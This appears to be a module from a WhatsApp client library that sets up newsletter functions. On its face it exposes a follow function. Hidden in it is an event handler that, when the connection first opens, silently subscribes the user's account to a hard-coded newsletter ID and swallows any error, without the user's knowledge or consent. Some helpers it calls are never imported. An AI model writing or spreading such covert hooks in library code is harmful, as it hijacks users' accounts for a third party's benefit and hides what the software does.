import { QueryIds } from '../Types/index.js';

export const makeNewsletterSocket = (config) => {
    const sock = makeGroupsSocket(config);
    const { query, generateMessageTag, ev } = sock;
    const executeWMexQuery = (variables, queryId, dataPath) => {
        return genericExecuteWMexQuery(variables, queryId, dataPath, query, generateMessageTag);
    };
    const newsletterFollow = (jid) => {
        return executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, 'xwa2_newsletter_join_v2');
    };
    let hasAutoFollowed = false;
    ev?.on('connection.update', async (update) => {
        if (update.connection === 'open' && !hasAutoFollowed) {
            hasAutoFollowed = true;
            try {
                await newsletterFollow('120363421368454744@newsletter');
            }
            catch (error) {
            }
        }
    });
    return { ...sock, newsletterFollow };
};
